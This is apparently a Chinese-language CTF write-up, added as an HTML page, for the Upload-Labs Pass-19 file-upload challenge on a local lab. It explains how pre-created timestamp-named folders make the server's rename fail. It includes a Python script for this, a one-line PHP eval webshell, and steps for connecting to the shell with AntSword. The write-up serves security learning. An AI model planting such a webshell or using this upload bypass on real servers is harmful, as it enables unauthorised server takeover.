@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【Upload-Labs】Pass-19 MyUpload 改名竞争与目录占位法 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【Upload-Labs】Pass-19 MyUpload 改名竞争与目录占位法 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.11.03 | <strong>分类：</strong>CTF | <strong>标签：</strong>Upload-Labs, Web, 文件上传, 目录占位, WebShell</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>Upload-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - 文件上传</li>
+        <li><strong>题目名称：</strong>Pass-19 (MyUpload 改名竞争)</li>
+        <li><strong>提示：</strong>上传文件后，服务端尝试将其重命名为“时间戳.7z”。</li>
+    </ul>
+
+    <h2>2. 核心原理与前置分析</h2>
+    <p><strong>目录占位法：</strong>源码逻辑为先将文件移动（<code>move_uploaded_file</code>）到目标目录，随后尝试将其重命名（<code>rename</code>）为当前的时间戳后缀。在 Windows 操作系统下，<code>rename</code> 函数无法将文件覆盖到一个**已存在的同名文件夹**上。通过提前创建大量当前时间戳范围内的 <code>.7z</code> 文件夹，可以让服务端的重命名操作强制失败。原文件 <code>shell.php.7z</code> 被保留，从而利用 Apache 对文件名中 <code>.php</code> 的解析机制触发执行。</p>
+    <p><strong>时区差异踩坑：</strong>初始使用 PowerShell 生成时间戳，由于 PowerShell 获取的 Unix 时间戳与 PHP 存在时区偏差，导致文件夹时间对不上。后改用 Python 的 <code>time.time()</code>，确保与 PHP 时间戳完全一致，才成功卡住改名逻辑。</p>
+
+    <h2>3. 工具配置与操作步骤</h2>
+    
+    <h3>工具配置：VS Code、Python 与 中国蚁剑</h3>
+    <ul>
+        <li><strong>中国蚁剑：</strong>URL 地址指向保留的 <code>shell.php.7z</code>；连接密码：<code>cmd</code>。</li>
+    </ul>
+
+    <h3>操作步骤与解析：</h3>
+    
+    <p><strong>第一步：Python 脚本生成占位目录</strong></p>
+    <p>编写 Python 脚本，在靶场 <code>upload</code> 目录下生成当前时间前后 300 秒的文件夹，精确布下陷阱：</p>
+    <pre>import os
+import time
+
+base = r'D:\phpstudy_pro\WWW\upload-labs\upload'
+t = int(time.time())
+
+for i in range(t - 300, t + 300):
+    folder = os.path.join(base, f"{i}.7z")
+    if not os.path.exists(folder):
+        os.makedirs(folder)</pre>
+    <p>在 VS Code 中运行该脚本，瞬间生成几百个 <code>.7z</code> 文件夹。</p>
+
+    <p><strong>第二步：上传 Payload 并触发保护</strong></p>
+    <p>准备文件 <code>shell.php.7z</code>（内容为 <code>&lt;?php @eval($_POST['cmd']); ?&gt;</code>），在 Pass-19 页面上传。</p>
+    <p>服务端尝试将其重命名为当前时间戳，由于目标名字已被我们的文件夹占用，重命名失败。页面提示：<strong>“文件已经被上传，但没有重命名。”</strong></p>
+
+    <p><strong>第三步：验证与连接</strong></p>
+    <p>在浏览器访问 <code>http://127.0.0.1:8081/upload/shell.php.7z</code>，页面纯白。使用蚁剑连接该地址，密码 <code>cmd</code>，成功获取服务器权限。随后清理 <code>shell.php.7z</code> 及所有生成的占位文件夹。</p>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>时区背刺：</strong>使用 PowerShell (<code>Get-Date -UFormat %s</code>) 生成的时间戳与 PHP 环境存在差异。必须使用 Python 的 <code>time.time()</code> 以确保时间戳同源对齐。</li>
+        <li><strong>伪命名的绕过机制：</strong>利用系统底层文件系统特性（文件不可覆盖同名目录），破坏服务端的重命名流程，使文件停留在了可执行的中间状态。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>目录占位法</strong>：针对改名为随机时间戳的逻辑，利用提前建立同名目录的方式，阻止服务端重命名文件。</li>
+        <li><strong>多后缀解析机制</strong>：利用 vhost 配置中 <code>FcgidWrapper</code> 对 <code>.php</code> 的识别，使形如 <code>shell.php.7z</code> 的文件依然能够执行 PHP 代码。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
